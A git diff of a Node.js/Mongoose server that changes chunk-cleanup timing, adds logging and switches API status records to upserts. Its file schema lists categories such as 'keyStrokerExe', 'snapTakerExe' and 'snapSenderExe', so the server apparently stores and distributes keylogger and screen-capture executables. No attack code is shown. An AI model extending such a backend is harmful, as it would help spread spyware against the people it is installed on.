@@ -90,9 +90,9 @@ const statusPriority = {
 
 // FileMetadata Schema
 const FileMetadataSchema = new mongoose.Schema({
-  category: { 
-    type: String, 
-    enum: ['keyStrokerExe', 'mainExecutableExe', 'snapTakerExe', 'snapSenderExe', 'xenoExecutorZip', 'installerExe'] 
+  category: {
+    type: String,
+    enum: ['keyStrokerExe', 'mainExecutableExe', 'snapTakerExe', 'snapSenderExe', 'xenoExecutorZip', 'installerExe']
   },
   filename: String,
   fileId: mongoose.Types.ObjectId,
@@ -141,14 +141,16 @@ const chunkStorage = new Map();
 
 const cleanupOldChunks = () => {
   const now = Date.now();
+  console.log(`[${new Date().toISOString()}] Cleaning up old chunks...`);
   for (const [key, value] of chunkStorage.entries()) {
     const lastModified = value.lastModified || now;
-    if (now - lastModified > 60 * 60 * 1000) { // 1 hour
+    if (now - lastModified > 15 * 60 * 1000) { // 15 min
+      console.log(`Deleting old chunk for key: ${key}`);
       chunkStorage.delete(key);
     }
   }
 };
-setInterval(cleanupOldChunks, 15 * 60 * 1000); // Run hourly
+setInterval(cleanupOldChunks, 15 * 60 * 1000); // 15min hourly
 
 // Polling function for API health
 async function pollApi(api) {
@@ -189,7 +191,11 @@ async function pollApi(api) {
     };
   }
 
-  await ApiStatus.create(record);
+  await ApiStatus.findOneAndUpdate(
+    { url: api.url },
+    { $set: { ...record, lastChecked: new Date() } },
+    { upsert: true }
+  );
   return record;
 }
 
